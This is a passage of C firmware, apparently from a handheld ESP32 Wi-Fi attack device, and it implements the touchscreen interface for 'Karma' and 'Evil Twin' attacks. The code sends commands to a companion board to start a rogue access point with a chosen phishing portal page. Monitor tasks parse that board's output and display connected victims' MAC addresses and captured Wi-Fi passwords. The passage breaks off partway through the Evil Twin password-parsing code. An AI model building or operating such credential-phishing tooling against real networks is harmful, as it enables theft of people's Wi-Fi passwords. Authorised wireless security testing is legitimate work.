            lv_obj_set_style_text_font(idx_lbl, &lv_font_montserrat_14, 0);
            lv_obj_set_style_text_color(idx_lbl, lv_color_hex(0x888888), 0);
            lv_obj_set_width(idx_lbl, 30);
            
            // SSID
            lv_obj_t *ssid_lbl = lv_label_create(row);
            lv_label_set_text(ssid_lbl, karma_probes[i].ssid);
            lv_obj_set_style_text_font(ssid_lbl, &lv_font_montserrat_16, 0);
            lv_obj_set_style_text_color(ssid_lbl, COLOR_MATERIAL_ORANGE, 0);
        }
    }
}

// Fetch HTML files for Karma (similar to Evil Twin)
static void karma_fetch_html_files(void)
{
    karma_html_count = 0;
    memset(karma_html_files, 0, sizeof(karma_html_files));
    
    uart_port_t uart_port = uart_port_for_tab(current_tab);
    uart_flush(uart_port);
    uart_send_command_for_tab("list_sd");
    
    static char rx_buffer[2048];
    static char line_buffer[256];
    int line_pos = 0;
    bool header_found = false;
    
    TickType_t start_time = xTaskGetTickCount();
    TickType_t timeout_ticks = pdMS_TO_TICKS(3000);
    
    while ((xTaskGetTickCount() - start_time) < timeout_ticks && karma_html_count < 20) {
        int len = transport_read_bytes(uart_port, rx_buffer, sizeof(rx_buffer) - 1, pdMS_TO_TICKS(100));
        
        if (len > 0) {
            rx_buffer[len] = '\0';
            
            for (int i = 0; i < len; i++) {
                char c = rx_buffer[i];
                
                if (c == '\n' || c == '\r') {
                    if (line_pos > 0) {
                        line_buffer[line_pos] = '\0';
                        
                        // Check for header line
                        if (strstr(line_buffer, "HTML files found") != NULL) {
                            header_found = true;
                        } else if (header_found && line_pos > 2) {
                            // Parse line format: "1 PLAY.html"
                            int file_num;
                            char filename[64];
                            if (sscanf(line_buffer, "%d %63s", &file_num, filename) == 2) {
                                snprintf(karma_html_files[karma_html_count], 
                                         sizeof(karma_html_files[0]), "%s", filename);
                                ESP_LOGI(TAG, "Karma: Found HTML file %d: %s", file_num, filename);
                                karma_html_count++;
                            }
                        }
                        
                        line_pos = 0;
                    }
                } else if (line_pos < (int)sizeof(line_buffer) - 1) {
                    line_buffer[line_pos++] = c;
                }
            }
        }
    }
    
    ESP_LOGI(TAG, "Karma: Found %d HTML files total", karma_html_count);
}

// Probe click callback - show HTML selection popup
static void karma_probe_click_cb(lv_event_t *e)
{
    int idx = (int)(intptr_t)lv_event_get_user_data(e);
    if (idx < 0 || idx >= karma_probe_count) return;
    
    karma_selected_probe_idx = idx;
    ESP_LOGI(TAG, "Karma: Selected probe %d: %s", idx, karma_probes[idx].ssid);
    
    lv_obj_t *container = get_current_tab_container();
    if (!container) return;
    
    // Create overlay
    karma_html_popup_overlay = lv_obj_create(container);
    lv_obj_remove_style_all(karma_html_popup_overlay);
    lv_obj_set_size(karma_html_popup_overlay, lv_pct(100), lv_pct(100));
    lv_obj_set_style_bg_color(karma_html_popup_overlay, lv_color_hex(0x000000), 0);
    lv_obj_set_style_bg_opa(karma_html_popup_overlay, LV_OPA_50, 0);
    lv_obj_clear_flag(karma_html_popup_overlay, LV_OBJ_FLAG_SCROLLABLE);
    lv_obj_add_flag(karma_html_popup_overlay, LV_OBJ_FLAG_CLICKABLE);
    
    // Create popup
    karma_html_popup_obj = lv_obj_create(karma_html_popup_overlay);
    lv_obj_set_size(karma_html_popup_obj, 450, 280);
    lv_obj_center(karma_html_popup_obj);
    lv_obj_set_style_bg_color(karma_html_popup_obj, lv_color_hex(0x1A1A2A), 0);
    lv_obj_set_style_border_color(karma_html_popup_obj, COLOR_MATERIAL_ORANGE, 0);
    lv_obj_set_style_border_width(karma_html_popup_obj, 3, 0);
    lv_obj_set_style_radius(karma_html_popup_obj, 16, 0);
    lv_obj_set_style_pad_all(karma_html_popup_obj, 20, 0);
    lv_obj_set_flex_flow(karma_html_popup_obj, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_flex_align(karma_html_popup_obj, LV_FLEX_ALIGN_START, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    lv_obj_set_style_pad_row(karma_html_popup_obj, 15, 0);
    lv_obj_clear_flag(karma_html_popup_obj, LV_OBJ_FLAG_SCROLLABLE);
    
    // Title
    lv_obj_t *title = lv_label_create(karma_html_popup_obj);
    lv_label_set_text(title, "Select HTML Portal File");
    lv_obj_set_style_text_font(title, &lv_font_montserrat_20, 0);
    lv_obj_set_style_text_color(title, COLOR_MATERIAL_ORANGE, 0);
    
    // Loading spinner
    lv_obj_t *spinner = lv_spinner_create(karma_html_popup_obj);
    lv_obj_set_size(spinner, 50, 50);
    lv_spinner_set_anim_params(spinner, 1000, 200);
    
    lv_obj_t *loading_label = lv_label_create(karma_html_popup_obj);
    lv_label_set_text(loading_label, "Loading HTML files...");
    lv_obj_set_style_text_font(loading_label, &lv_font_montserrat_14, 0);
    lv_obj_set_style_text_color(loading_label, lv_color_hex(0x888888), 0);
    
    // Force refresh to show loading state
    lv_refr_now(NULL);
    bsp_display_unlock();
    
    // Fetch HTML files
    karma_fetch_html_files();
    
    bsp_display_lock(0);
    
    // Remove loading elements
    lv_obj_del(spinner);
    lv_obj_del(loading_label);
    
    if (karma_html_count == 0) {
        lv_obj_t *error_label = lv_label_create(karma_html_popup_obj);
        lv_label_set_text(error_label, "No HTML files found on SD card");
        lv_obj_set_style_text_font(error_label, &lv_font_montserrat_16, 0);
        lv_obj_set_style_text_color(error_label, COLOR_MATERIAL_RED, 0);
        
        // Close button
        lv_obj_t *close_btn = lv_btn_create(karma_html_popup_obj);
        lv_obj_set_size(close_btn, 100, 40);
        lv_obj_set_style_bg_color(close_btn, lv_color_hex(0x333333), 0);
        lv_obj_set_style_radius(close_btn, 8, 0);
        lv_obj_add_event_cb(close_btn, karma_html_popup_close_cb, LV_EVENT_CLICKED, NULL);
        
        lv_obj_t *close_label = lv_label_create(close_btn);
        lv_label_set_text(close_label, "Close");
        lv_obj_center(close_label);
        return;
    }
    
    // SSID info
    lv_obj_t *ssid_label = lv_label_create(karma_html_popup_obj);
    lv_label_set_text_fmt(ssid_label, "Target: %s", karma_probes[idx].ssid);
    lv_obj_set_style_text_font(ssid_label, &lv_font_montserrat_14, 0);
    lv_obj_set_style_text_color(ssid_label, lv_color_hex(0xCCCCCC), 0);
    
    // HTML dropdown
    karma_html_dropdown = lv_dropdown_create(karma_html_popup_obj);
    lv_obj_set_width(karma_html_dropdown, 350);
    
    char options[2048] = "";
    for (int i = 0; i < karma_html_count; i++) {
        if (i > 0) strncat(options, "\n", sizeof(options) - strlen(options) - 1);
        strncat(options, karma_html_files[i], sizeof(options) - strlen(options) - 1);
    }
    lv_dropdown_set_options(karma_html_dropdown, options);
    lv_obj_set_style_bg_color(karma_html_dropdown, lv_color_hex(0x252525), 0);
    lv_obj_set_style_text_color(karma_html_dropdown, lv_color_hex(0xFFFFFF), 0);
    
    // Buttons row
    lv_obj_t *btn_row = lv_obj_create(karma_html_popup_obj);
    lv_obj_set_size(btn_row, lv_pct(100), LV_SIZE_CONTENT);
    lv_obj_set_style_bg_opa(btn_row, LV_OPA_TRANSP, 0);
    lv_obj_set_style_border_width(btn_row, 0, 0);
    lv_obj_set_style_pad_all(btn_row, 0, 0);
    lv_obj_set_flex_flow(btn_row, LV_FLEX_FLOW_ROW);
    lv_obj_set_flex_align(btn_row, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    lv_obj_set_style_pad_column(btn_row, 20, 0);
    lv_obj_clear_flag(btn_row, LV_OBJ_FLAG_SCROLLABLE);
    
    // Cancel button
    lv_obj_t *cancel_btn = lv_btn_create(btn_row);
    lv_obj_set_size(cancel_btn, 100, 40);
    lv_obj_set_style_bg_color(cancel_btn, lv_color_hex(0x333333), 0);
    lv_obj_set_style_radius(cancel_btn, 8, 0);
    lv_obj_add_event_cb(cancel_btn, karma_html_popup_close_cb, LV_EVENT_CLICKED, NULL);
    
    lv_obj_t *cancel_label = lv_label_create(cancel_btn);
    lv_label_set_text(cancel_label, "Cancel");
    lv_obj_center(cancel_label);
    
    // Start button
    lv_obj_t *start_btn = lv_btn_create(btn_row);
    lv_obj_set_size(start_btn, 120, 40);
    lv_obj_set_style_bg_color(start_btn, COLOR_MATERIAL_ORANGE, 0);
    lv_obj_set_style_radius(start_btn, 8, 0);
    lv_obj_add_event_cb(start_btn, karma_html_select_cb, LV_EVENT_CLICKED, NULL);
    
    lv_obj_t *start_label = lv_label_create(start_btn);
    lv_label_set_text(start_label, "Start Karma");
    lv_obj_center(start_label);
}

// HTML popup close callback
static void karma_html_popup_close_cb(lv_event_t *e)
{
    (void)e;
    if (karma_html_popup_overlay) {
        lv_obj_del(karma_html_popup_overlay);
        karma_html_popup_overlay = NULL;
        karma_html_popup_obj = NULL;
        karma_html_dropdown = NULL;
    }
}

// Karma attack actual start logic
static void do_karma_attack_start(void)
{
    if (!karma_html_dropdown || karma_selected_probe_idx < 0) return;
    
    int html_idx = lv_dropdown_get_selected(karma_html_dropdown);
    int probe_idx = karma_probes[karma_selected_probe_idx].index;
    
    ESP_LOGI(TAG, "Karma: Starting attack - probe %d, html %d", probe_idx, html_idx);
    
    // Close HTML popup
    if (karma_html_popup_overlay) {
        lv_obj_del(karma_html_popup_overlay);
        karma_html_popup_overlay = NULL;
        karma_html_popup_obj = NULL;
        karma_html_dropdown = NULL;
    }
    
    // Stop any running operation first
    uart_send_command_for_tab("stop");
    vTaskDelay(pdMS_TO_TICKS(200));
    
    // Send select_html command (1-based index)
    char cmd[32];
    snprintf(cmd, sizeof(cmd), "select_html %d", html_idx + 1);
    uart_send_command_for_tab(cmd);
    vTaskDelay(pdMS_TO_TICKS(200));
    
    // Send start_karma command
    snprintf(cmd, sizeof(cmd), "start_karma %d", probe_idx);
    uart_send_command_for_tab(cmd);
    
    // Create attack popup
    lv_obj_t *container = get_current_tab_container();
    if (!container) return;
    
    karma_attack_popup_overlay = lv_obj_create(container);
    lv_obj_remove_style_all(karma_attack_popup_overlay);
    lv_obj_set_size(karma_attack_popup_overlay, lv_pct(100), lv_pct(100));
    lv_obj_set_style_bg_color(karma_attack_popup_overlay, lv_color_hex(0x000000), 0);
    lv_obj_set_style_bg_opa(karma_attack_popup_overlay, LV_OPA_50, 0);
    lv_obj_clear_flag(karma_attack_popup_overlay, LV_OBJ_FLAG_SCROLLABLE);
    lv_obj_add_flag(karma_attack_popup_overlay, LV_OBJ_FLAG_CLICKABLE);
    
    karma_attack_popup_obj = lv_obj_create(karma_attack_popup_overlay);
    lv_obj_set_size(karma_attack_popup_obj, 500, 350);
    lv_obj_center(karma_attack_popup_obj);
    lv_obj_set_style_bg_color(karma_attack_popup_obj, lv_color_hex(0x1A1A2A), 0);
    lv_obj_set_style_border_color(karma_attack_popup_obj, COLOR_MATERIAL_ORANGE, 0);
    lv_obj_set_style_border_width(karma_attack_popup_obj, 3, 0);
    lv_obj_set_style_radius(karma_attack_popup_obj, 16, 0);
    lv_obj_set_style_pad_all(karma_attack_popup_obj, 25, 0);
    lv_obj_set_flex_flow(karma_attack_popup_obj, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_flex_align(karma_attack_popup_obj, LV_FLEX_ALIGN_START, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    lv_obj_set_style_pad_row(karma_attack_popup_obj, 12, 0);
    lv_obj_clear_flag(karma_attack_popup_obj, LV_OBJ_FLAG_SCROLLABLE);
    
    // Title
    lv_obj_t *title = lv_label_create(karma_attack_popup_obj);
    lv_label_set_text(title, LV_SYMBOL_WIFI " Karma Attack Active");
    lv_obj_set_style_text_font(title, &lv_font_montserrat_22, 0);
    lv_obj_set_style_text_color(title, COLOR_MATERIAL_ORANGE, 0);
    
    // SSID label
    karma_attack_ssid_label = lv_label_create(karma_attack_popup_obj);
    lv_label_set_text(karma_attack_ssid_label, "Starting portal...");
    lv_obj_set_style_text_font(karma_attack_ssid_label, &lv_font_montserrat_18, 0);
    lv_obj_set_style_text_color(karma_attack_ssid_label, lv_color_hex(0xCCCCCC), 0);
    
    // MAC label
    karma_attack_mac_label = lv_label_create(karma_attack_popup_obj);
    lv_label_set_text(karma_attack_mac_label, "Waiting for clients...");
    lv_obj_set_style_text_font(karma_attack_mac_label, &lv_font_montserrat_16, 0);
    lv_obj_set_style_text_color(karma_attack_mac_label, lv_color_hex(0x888888), 0);
    
    // Password label
    karma_attack_password_label = lv_label_create(karma_attack_popup_obj);
    lv_label_set_text(karma_attack_password_label, "");
    lv_obj_set_style_text_font(karma_attack_password_label, &lv_font_montserrat_20, 0);
    lv_obj_set_style_text_color(karma_attack_password_label, COLOR_MATERIAL_GREEN, 0);
    
    // Stop button
    lv_obj_t *stop_btn = lv_btn_create(karma_attack_popup_obj);
    lv_obj_set_size(stop_btn, 140, 50);
    lv_obj_set_style_bg_color(stop_btn, COLOR_MATERIAL_RED, 0);
    lv_obj_set_style_radius(stop_btn, 10, 0);
    lv_obj_add_event_cb(stop_btn, karma_attack_popup_close_cb, LV_EVENT_CLICKED, NULL);
    
    lv_obj_t *stop_label = lv_label_create(stop_btn);
    lv_label_set_text(stop_label, "STOP");
    lv_obj_set_style_text_font(stop_label, &lv_font_montserrat_18, 0);
    lv_obj_center(stop_label);
    
    // Start monitoring task
    karma_monitoring = true;
    
    // Also mark in context
    tab_context_t *ctx = get_current_ctx();
    if (ctx) {
        ctx->karma_monitoring = true;
    }
    
    xTaskCreate(karma_monitor_task, "karma_mon", 4096, (void*)ctx, 5, &karma_monitor_task_handle);
}

// HTML select callback - start karma attack
static void karma_html_select_cb(lv_event_t *e)
{
    (void)e;
    
    // Check SD card presence
    if (!current_tab_has_sd_card() && !sd_warning_acknowledged) {
        show_sd_warning_popup(do_karma_attack_start);
        return;
    }
    
    do_karma_attack_start();
}

// Karma attack popup close callback
static void karma_attack_popup_close_cb(lv_event_t *e)
{
    (void)e;
    ESP_LOGI(TAG, "Karma: Stopping attack");
    
    // Stop monitoring
    karma_monitoring = false;
    if (karma_monitor_task_handle != NULL) {
        vTaskDelay(pdMS_TO_TICKS(100));
        karma_monitor_task_handle = NULL;
    }
    
    // Send stop command to current tab's UART
    uart_send_command_for_tab("stop");
    
    // Close popup
    if (karma_attack_popup_overlay) {
        lv_obj_del(karma_attack_popup_overlay);
        karma_attack_popup_overlay = NULL;
        karma_attack_popup_obj = NULL;
        karma_attack_ssid_label = NULL;
        karma_attack_mac_label = NULL;
        karma_attack_password_label = NULL;
    }
}

// Karma monitor task - watches for portal status, client connect, password
static void karma_monitor_task(void *arg)
{
    // Get context passed to task
    tab_context_t *ctx = (tab_context_t *)arg;
    
    // Determine UART from context
    tab_id_t task_tab = tab_id_for_ctx(ctx);
    uart_port_t uart_port = (task_tab == TAB_MBUS && uart2_initialized) ? UART2_NUM : UART_NUM;
    const char *uart_name = tab_transport_name(task_tab);
    
    ESP_LOGI(TAG, "[%s] Karma monitor task started for tab %d", uart_name, task_tab);
    
    static char rx_buffer[256];
    static char line_buffer[256];
    int line_pos = 0;
    
    // Use context's flag instead of global
    while (ctx && ctx->karma_monitoring) {
        int len = transport_read_bytes(uart_port, rx_buffer, sizeof(rx_buffer) - 1, pdMS_TO_TICKS(100));
        
        if (len > 0) {
            rx_buffer[len] = '\0';
            
            for (int i = 0; i < len; i++) {
                char c = rx_buffer[i];
                
                if (c == '\n' || c == '\r') {
                    if (line_pos > 0) {
                        line_buffer[line_pos] = '\0';
                        ESP_LOGI(TAG, "Karma UART: %s", line_buffer);
                        
                        // Check for portal started
                        char *ap_name = strstr(line_buffer, "AP Name:");
                        if (ap_name != NULL) {
                            ap_name += 8;
                            while (*ap_name == ' ') ap_name++;
                            
                            bsp_display_lock(0);
                            if (karma_attack_ssid_label) {
                                lv_label_set_text_fmt(karma_attack_ssid_label, "Portal started: %s", ap_name);
                                lv_obj_set_style_text_color(karma_attack_ssid_label, COLOR_MATERIAL_GREEN, 0);
                            }
                            bsp_display_unlock();
                        }
                        
                        // Check for client connected
                        char *mac_ptr = strstr(line_buffer, "Client connected - MAC:");
                        if (mac_ptr != NULL) {
                            mac_ptr += 23;
                            while (*mac_ptr == ' ') mac_ptr++;
                            
                            char mac[20] = {0};
                            int j = 0;
                            while (mac_ptr[j] && mac_ptr[j] != ' ' && mac_ptr[j] != '\n' && j < 17) {
                                mac[j] = mac_ptr[j];
                                j++;
                            }
                            mac[j] = '\0';
                            
                            bsp_display_lock(0);
                            if (karma_attack_mac_label) {
                                lv_label_set_text_fmt(karma_attack_mac_label, "Last MAC connected: %s", mac);
                                lv_obj_set_style_text_color(karma_attack_mac_label, COLOR_MATERIAL_CYAN, 0);
                            }
                            bsp_display_unlock();
                        }
                        
                        // Check for password
                        char *pass_ptr = strstr(line_buffer, "Password:");
                        if (pass_ptr != NULL) {
                            pass_ptr += 9;
                            while (*pass_ptr == ' ') pass_ptr++;
                            
                            // Trim trailing whitespace
                            char pass[64] = {0};
                            strncpy(pass, pass_ptr, sizeof(pass) - 1);
                            size_t pass_len = strlen(pass);
                            while (pass_len > 0 && isspace((unsigned char)pass[pass_len - 1])) {
                                pass[--pass_len] = '\0';
                            }
                            
                            if (strlen(pass) > 0) {
                                bsp_display_lock(0);
                                if (karma_attack_password_label) {
                                    lv_label_set_text_fmt(karma_attack_password_label, "Password obtained: %s", pass);
                                }
                                bsp_display_unlock();
                            }
                        }
                        
                        line_pos = 0;
                    }
                } else if (line_pos < (int)sizeof(line_buffer) - 1) {
                    line_buffer[line_pos++] = c;
                }
            }
        }
        
        vTaskDelay(pdMS_TO_TICKS(50));
    }
    
    ESP_LOGI(TAG, "Karma monitor task ended");
    karma_monitor_task_handle = NULL;
    vTaskDelete(NULL);
}

// Show Karma page (inside current tab's container)
static void show_karma_page(void)
{
    ESP_LOGI(TAG, "Showing Karma page");
    
    // Reset state
    karma_probe_count = 0;
    karma_selected_probe_idx = -1;
    
    // Get current tab's data and container
    tab_context_t *ctx = get_current_ctx();
    lv_obj_t *container = get_current_tab_container();
    
    if (!container) {
        ESP_LOGE(TAG, "Container not initialized for tab %d", current_tab);
        return;
    }
    
    // Hide all other pages
    hide_all_pages(ctx);
    
    // If page already exists for this tab, just show it
    if (ctx->karma_page) {
        lv_obj_clear_flag(ctx->karma_page, LV_OBJ_FLAG_HIDDEN);
        ctx->current_visible_page = ctx->karma_page;
        karma_page = ctx->karma_page;  // Update legacy reference
        ESP_LOGI(TAG, "Showing existing karma page for tab %d", current_tab);
        return;
    }
    
    ESP_LOGI(TAG, "Creating new karma page for tab %d", current_tab);
    
    // Create karma page container inside tab container
    ctx->karma_page = lv_obj_create(container);
    karma_page = ctx->karma_page;  // Keep legacy reference
    lv_obj_set_size(karma_page, lv_pct(100), lv_pct(100));
    lv_obj_set_style_bg_color(karma_page, lv_color_hex(0x1A1A1A), 0);
    lv_obj_set_style_border_width(karma_page, 0, 0);
    lv_obj_set_style_pad_all(karma_page, 15, 0);
    lv_obj_set_flex_flow(karma_page, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_style_pad_row(karma_page, 10, 0);
    
    // Header
    lv_obj_t *header = lv_obj_create(karma_page);
    lv_obj_set_size(header, lv_pct(100), LV_SIZE_CONTENT);
    lv_obj_set_style_bg_opa(header, LV_OPA_TRANSP, 0);
    lv_obj_set_style_border_width(header, 0, 0);
    lv_obj_set_style_pad_all(header, 0, 0);
    lv_obj_set_flex_flow(header, LV_FLEX_FLOW_ROW);
    lv_obj_set_flex_align(header, LV_FLEX_ALIGN_START, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    lv_obj_set_style_pad_column(header, 15, 0);
    lv_obj_clear_flag(header, LV_OBJ_FLAG_SCROLLABLE);
    
    // Back button
    lv_obj_t *back_btn = lv_btn_create(header);
    lv_obj_set_size(back_btn, 72, 60);
    lv_obj_set_style_bg_color(back_btn, lv_color_hex(0x333333), 0);
    lv_obj_set_style_bg_color(back_btn, lv_color_hex(0x444444), LV_STATE_PRESSED);
    lv_obj_set_style_radius(back_btn, 8, 0);
    lv_obj_add_event_cb(back_btn, karma_back_cb, LV_EVENT_CLICKED, NULL);
    
    lv_obj_t *back_icon = lv_label_create(back_btn);
    lv_label_set_text(back_icon, LV_SYMBOL_LEFT);
    lv_obj_set_style_text_color(back_icon, lv_color_hex(0xFFFFFF), 0);
    lv_obj_center(back_icon);
    
    // Title
    lv_obj_t *title = lv_label_create(header);
    lv_label_set_text(title, "Karma Attack");
    lv_obj_set_style_text_font(title, &lv_font_montserrat_22, 0);
    lv_obj_set_style_text_color(title, COLOR_MATERIAL_ORANGE, 0);
    
    // Button bar
    lv_obj_t *btn_bar = lv_obj_create(karma_page);
    lv_obj_set_size(btn_bar, lv_pct(100), LV_SIZE_CONTENT);
    lv_obj_set_style_bg_opa(btn_bar, LV_OPA_TRANSP, 0);
    lv_obj_set_style_border_width(btn_bar, 0, 0);
    lv_obj_set_style_pad_all(btn_bar, 0, 0);
    lv_obj_set_flex_flow(btn_bar, LV_FLEX_FLOW_ROW);
    lv_obj_set_flex_align(btn_bar, LV_FLEX_ALIGN_START, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    lv_obj_set_style_pad_column(btn_bar, 15, 0);
    lv_obj_clear_flag(btn_bar, LV_OBJ_FLAG_SCROLLABLE);
    
    // Start Sniffer button
    karma_start_sniffer_btn = lv_btn_create(btn_bar);
    lv_obj_set_size(karma_start_sniffer_btn, 130, 45);
    lv_obj_set_style_bg_color(karma_start_sniffer_btn, COLOR_MATERIAL_GREEN, 0);
    lv_obj_set_style_bg_color(karma_start_sniffer_btn, lv_color_hex(0x555555), LV_STATE_DISABLED);
    lv_obj_set_style_radius(karma_start_sniffer_btn, 8, 0);
    lv_obj_add_event_cb(karma_start_sniffer_btn, karma_start_sniffer_cb, LV_EVENT_CLICKED, NULL);
    
    lv_obj_t *start_label = lv_label_create(karma_start_sniffer_btn);
    lv_label_set_text(start_label, "Start Sniffer");
    lv_obj_set_style_text_font(start_label, &lv_font_montserrat_14, 0);
    lv_obj_center(start_label);
    
    // Stop Sniffer button
    karma_stop_sniffer_btn = lv_btn_create(btn_bar);
    lv_obj_set_size(karma_stop_sniffer_btn, 130, 45);
    lv_obj_set_style_bg_color(karma_stop_sniffer_btn, COLOR_MATERIAL_RED, 0);
    lv_obj_set_style_bg_color(karma_stop_sniffer_btn, lv_color_hex(0x555555), LV_STATE_DISABLED);
    lv_obj_set_style_radius(karma_stop_sniffer_btn, 8, 0);
    lv_obj_add_event_cb(karma_stop_sniffer_btn, karma_stop_sniffer_cb, LV_EVENT_CLICKED, NULL);
    
    lv_obj_t *stop_label = lv_label_create(karma_stop_sniffer_btn);
    lv_label_set_text(stop_label, "Stop Sniffer");
    lv_obj_set_style_text_font(stop_label, &lv_font_montserrat_14, 0);
    lv_obj_center(stop_label);
    
    // Initially: Start enabled, Stop disabled (sniffer not running)
    karma_sniffer_running = false;
    lv_obj_add_state(karma_stop_sniffer_btn, LV_STATE_DISABLED);
    
    // Show Probes button
    lv_obj_t *probes_btn = lv_btn_create(btn_bar);
    lv_obj_set_size(probes_btn, 130, 45);
    lv_obj_set_style_bg_color(probes_btn, COLOR_MATERIAL_CYAN, 0);
    lv_obj_set_style_radius(probes_btn, 8, 0);
    lv_obj_add_event_cb(probes_btn, karma_show_probes_cb, LV_EVENT_CLICKED, NULL);
    
    lv_obj_t *probes_label = lv_label_create(probes_btn);
    lv_label_set_text(probes_label, "Show Probes");
    lv_obj_set_style_text_font(probes_label, &lv_font_montserrat_14, 0);
    lv_obj_center(probes_label);
    
    // Status label
    karma_status_label = lv_label_create(karma_page);
    lv_label_set_text(karma_status_label, "Start sniffer to collect probe requests");
    lv_obj_set_style_text_font(karma_status_label, &lv_font_montserrat_14, 0);
    lv_obj_set_style_text_color(karma_status_label, lv_color_hex(0x888888), 0);
    
    // Probes container (scrollable)
    karma_probes_container = lv_obj_create(karma_page);
    lv_obj_set_size(karma_probes_container, lv_pct(100), LV_SIZE_CONTENT);
    lv_obj_set_flex_grow(karma_probes_container, 1);
    lv_obj_set_style_bg_color(karma_probes_container, lv_color_hex(0x252525), 0);
    lv_obj_set_style_border_width(karma_probes_container, 0, 0);
    lv_obj_set_style_radius(karma_probes_container, 8, 0);
    lv_obj_set_style_pad_all(karma_probes_container, 10, 0);
    lv_obj_set_flex_flow(karma_probes_container, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_style_pad_row(karma_probes_container, 6, 0);
    
    lv_obj_t *placeholder = lv_label_create(karma_probes_container);
    lv_label_set_text(placeholder, "Click 'Show Probes' after sniffing to see collected probe requests");
    lv_obj_set_style_text_font(placeholder, &lv_font_montserrat_14, 0);
    lv_obj_set_style_text_color(placeholder, lv_color_hex(0x666666), 0);
    
    // Set current visible page
    ctx->current_visible_page = ctx->karma_page;
}

// ======================= Evil Twin Attack Functions =======================

// Fetch HTML files list from SD card via UART
static void fetch_html_files_from_sd(void)
{
    evil_twin_html_count = 0;
    memset(evil_twin_html_files, 0, sizeof(evil_twin_html_files));
    
    // Flush UART buffer
    uart_port_t uart_port = uart_port_for_tab(current_tab);
    uart_flush(uart_port);
    
    // Send list_sd command to current tab's UART
    uart_send_command_for_tab("list_sd");
    
    // Buffer for receiving data
    static char rx_buffer[2048];
    static char line_buffer[256];
    int line_pos = 0;
    bool header_found = false;
    
    TickType_t start_time = xTaskGetTickCount();
    TickType_t timeout_ticks = pdMS_TO_TICKS(3000);  // 3 second timeout
    
    while ((xTaskGetTickCount() - start_time) < timeout_ticks && evil_twin_html_count < 20) {
        int len = transport_read_bytes(uart_port, rx_buffer, sizeof(rx_buffer) - 1, pdMS_TO_TICKS(100));
        
        if (len > 0) {
            rx_buffer[len] = '\0';
            
            for (int i = 0; i < len; i++) {
                char c = rx_buffer[i];
                
                if (c == '\n' || c == '\r') {
                    if (line_pos > 0) {
                        line_buffer[line_pos] = '\0';
                        
                        // Check for header line
                        if (strstr(line_buffer, "HTML files found") != NULL) {
                            header_found = true;
                        } else if (header_found && line_pos > 2) {
                            // Parse line format: "1 PLAY.html"
                            int file_num;
                            char filename[64];
                            if (sscanf(line_buffer, "%d %63s", &file_num, filename) == 2) {
                                snprintf(evil_twin_html_files[evil_twin_html_count], 
                                         sizeof(evil_twin_html_files[0]), "%s", filename);
                                ESP_LOGI(TAG, "Found HTML file %d: %s", file_num, filename);
                                evil_twin_html_count++;
                            }
                        }
                        
                        line_pos = 0;
                    }
                } else if (line_pos < (int)sizeof(line_buffer) - 1) {
                    line_buffer[line_pos++] = c;
                }
            }
        }
    }
    
    ESP_LOGI(TAG, "Fetched %d HTML files from SD card", evil_twin_html_count);
}

// Close Evil Twin popup
static void evil_twin_close_cb(lv_event_t *e)
{
    (void)e;
    ESP_LOGI(TAG, "Evil Twin popup closed");
    
    tab_context_t *ctx = get_current_ctx();
    if (!ctx) return;
    
    // Stop monitoring
    ctx->evil_twin_monitoring = false;
    
    // Send stop command to current tab's UART
    uart_send_command_for_tab("stop");
    
    // Delete overlay (popup is child, will be deleted too)
    if (ctx->evil_twin_overlay) {
        lv_obj_del(ctx->evil_twin_overlay);
        ctx->evil_twin_overlay = NULL;
        ctx->evil_twin_popup = NULL;
        ctx->evil_twin_network_dropdown = NULL;
        ctx->evil_twin_html_dropdown = NULL;
        ctx->evil_twin_status_label = NULL;
    }
}

// Evil Twin monitor task - watches UART for password capture
static void evil_twin_monitor_task(void *arg)
{
    // Get context passed to task
    tab_context_t *ctx = (tab_context_t *)arg;
    if (!ctx) {
        ESP_LOGE(TAG, "Evil Twin monitor task: NULL context!");
        vTaskDelete(NULL);
        return;
    }
    
    // Determine UART from context
    tab_id_t task_tab = tab_id_for_ctx(ctx);
    uart_port_t uart_port = uart_port_for_tab(task_tab);
    const char *uart_name = tab_transport_name(task_tab);
    
    static char rx_buffer[1024];
    static char line_buffer[512];
    int line_pos = 0;
    
    ESP_LOGI(TAG, "[%s] Evil Twin monitor task started for tab %d", uart_name, task_tab);
    
    // Use context field instead of global
    while (ctx->evil_twin_monitoring) {
        int len = transport_read_bytes(uart_port, rx_buffer, sizeof(rx_buffer) - 1, pdMS_TO_TICKS(200));
        
        if (len > 0) {
            rx_buffer[len] = '\0';
            
            for (int i = 0; i < len; i++) {
                char c = rx_buffer[i];
                
                if (c == '\n' || c == '\r') {
                    if (line_pos > 0) {
                        line_buffer[line_pos] = '\0';
                        ESP_LOGI(TAG, "[%s] Evil Twin: %s", uart_name, line_buffer);
                        
                        // Look for client connection: "Client connected - MAC: XX:XX:XX:XX:XX:XX"
                        char *client_connected = strstr(line_buffer, "Client connected - MAC:");
                        if (client_connected && ctx->evil_twin_status_label) {
                            // Extract MAC address
                            char mac[20] = {0};
                            char *mac_start = client_connected + 24;  // Skip "Client connected - MAC: "
                            int mac_len = 0;
                            while (mac_start[mac_len] && mac_start[mac_len] != '\n' && mac_start[mac_len] != '\r' && mac_len < 17) {
                                mac[mac_len] = mac_start[mac_len];
                                mac_len++;
                            }
                            
                            // Update status with client connected message
                            char status_text[256];
                            snprintf(status_text, sizeof(status_text),
                                "Client connected!\n\n"
                                "MAC: %s\n\n"
                                "Waiting for password...", mac);
                            bsp_display_lock(0);
                            lv_label_set_text(ctx->evil_twin_status_label, status_text);
                            lv_obj_set_style_text_color(ctx->evil_twin_status_label, COLOR_MATERIAL_AMBER, 0);
                            bsp_display_unlock();
                        }
                        
                        // Look for password capture pattern:
                        // "Wi-Fi: connected to SSID='XXX' with password='YYY'"
                        // Note: SSID and password may be quoted with single quotes
                        char *connected = strstr(line_buffer, "connected to SSID=");
                        char *pwd_start = strstr(line_buffer, "password=");
                        
                        if (connected && pwd_start) {
                            // Extract SSID (skip "connected to SSID=" and possible quote)
                            char captured_ssid[64] = {0};
